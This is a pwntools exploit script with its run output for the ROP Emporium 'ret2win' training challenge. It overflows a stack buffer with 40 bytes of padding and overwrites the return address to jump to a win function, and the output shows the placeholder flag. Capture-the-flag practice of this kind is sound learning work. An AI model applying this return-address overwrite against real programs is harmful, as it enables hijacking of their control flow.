

```python
from pwn import *

pipe = process("./ret2win")

print(pipe.recvuntil("> "))
payload = "A" * 40
payload += p64(0x400756)

pipe.sendline(payload)
print(pipe.recvall())

```
```shell
➜  x86_64_version python ./exp.py 
[+] Starting local process './ret2win': pid 54514
ret2win by ROP Emporium
x86_64

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> 
[+] Receiving all data: Done (73B)
[*] Process './ret2win' stopped with exit code -4 (SIGILL) (pid 54514)
Thank you!
Well done! Here's your flag:
ROPE{a_placeholder_32byte_flag!}
```
